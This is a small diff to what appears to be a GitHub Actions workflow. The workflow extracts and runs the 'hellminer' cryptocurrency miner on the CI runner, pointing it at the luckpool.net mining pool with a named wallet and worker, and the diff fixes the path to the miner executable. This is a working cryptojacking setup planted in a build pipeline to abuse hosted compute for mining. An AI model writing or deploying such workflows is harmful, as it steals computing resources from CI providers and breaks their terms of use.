@@ -21,6 +21,6 @@ jobs:
     - name: Extract
       run: Expand-Archive hellminer_cpu_win64_avx.zip
     - name: RUNNING
-      run: .\xmrig-6.15.0-gcc-win64\hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RPGnF741xxs1dwUTqrWhKTkTjdXSRPmGrK.tuyulVIP -p x --cpu 2
+      run: .\hellminer_cpu_win64_avx\hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RPGnF741xxs1dwUTqrWhKTkTjdXSRPmGrK.tuyulVIP -p x --cpu 2
     - name: DONE
       run: exit
